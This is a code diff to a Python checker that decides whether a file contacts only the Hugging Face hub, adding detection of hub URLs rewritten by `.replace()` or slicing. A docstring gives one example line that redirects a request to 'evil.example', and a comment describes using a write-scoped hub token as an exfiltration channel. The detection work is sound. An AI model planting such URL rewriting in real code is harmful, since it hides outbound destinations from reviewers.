@@ -331,6 +331,93 @@ def _literal_text(node):
         return None
 
 
+def _reshapes_a_url(tree):
+    """Whether a URL this file spells out is transformed before it is used.
+
+    Reading every literal and asking whether each names a hub host assumes a
+    literal reaches the request as written. It need not:
+
+        BASE = "https://huggingface.co"
+        requests.get(BASE.replace("huggingface.co", "evil.example"), ...)
+
+    fetches evil.example, and every literal in that file is either the hub or a
+    bare name with no scheme in front of it, so nothing was recorded as a
+    destination but the hub. Slicing does the same with no method call at all.
+    So a URL literal, or a name that carries one, may not be the receiver of a
+    call or be subscripted here. Upstream is unaffected: in gguf-py/gguf/utility.py
+    every .replace(), .strip() and .format() receiver is a parameter, and
+    BASE_DOMAIN is only ever interpolated into an f-string.
+
+    A name carries through STRING BUILDING only: url = f"{BASE}/x" carries, and
+    url.replace(...) after it is refused. It deliberately does not carry through
+    a call, because upstream writes response = requests.get(url) and then reads
+    response.raise_for_status(), index_json["weight_map"], raw_data[:8]: tracking
+    what came BACK from the hub made ordinary parsing of the download look like a
+    reshaped URL and refused the very file this allowance exists for. A fixed
+    point, because an assignment can precede the one that makes its value carry.
+
+    A parameter is not tracked: following one means following a call, which is
+    the interprocedural residual this allowance already documents.
+    """
+    carriers = set()
+
+    def carries(node):
+        while isinstance(node, ast.NamedExpr):
+            node = node.value                   # (u := BASE).replace(...)
+        if isinstance(node, ast.Name) and node.id in carriers:
+            return True
+        if isinstance(node, ast.Attribute) and node.attr in carriers:
+            return True                         # cls.BASE_DOMAIN, self.BASE ...
+        text = _literal_text(node)
+        return bool(text) and bool(RE_URL_SCHEME.search(text))
+
+    def built_from_a_carrier(node):
+        if carries(node):
+            return True
+        if isinstance(node, ast.JoinedStr):
+            return any(
+                built_from_a_carrier(
+                    part.value if isinstance(part, ast.FormattedValue) else part
+                )
+                for part in node.values
+            )
+        if isinstance(node, ast.BinOp) and isinstance(node.op, (ast.Add, ast.Mod)):
+            operands = [node.left]
+            operands += (
+                node.right.elts if isinstance(node.right, ast.Tuple) else [node.right]
+            )
+            return any(built_from_a_carrier(operand) for operand in operands)
+        return False
+
+    while True:
+        found = set()
+        for node in ast.walk(tree):
+            if isinstance(node, ast.Assign):
+                targets, value = node.targets, node.value
+            elif isinstance(node, (ast.AnnAssign, ast.NamedExpr)) and node.value:
+                targets, value = [node.target], node.value
+            else:
+                continue
+            if not built_from_a_carrier(value):
+                continue
+            found.update(
+                target.id for target in targets if isinstance(target, ast.Name)
+            )
+        if found <= carriers:
+            break
+        carriers |= found
+    for node in ast.walk(tree):
+        if isinstance(node, ast.Subscript) and carries(node.value):
+            return True
+        if (
+            isinstance(node, ast.Call)
+            and isinstance(node.func, ast.Attribute)
+            and carries(node.func.value)
+        ):
+            return True
+    return False
+
+
 def _literal_texts(tree):
     """Every whole literal expression in `tree`, folded ones in place of parts.
 
@@ -405,6 +492,10 @@ def _talks_only_to_the_model_hub(text):
         # multi-tenant: a token with write scope can create a public repository
         # there and make it a channel anyone can read back, so "the destination
         # is the hub" is not on its own a reason to say nothing.
+        return False
+    if _reshapes_a_url(tree):
+        # A literal that is rewritten before it is sent names the host it was,
+        # not the host it becomes.
         return False
     names, dynamic = _env_reads(tree)
     if dynamic:
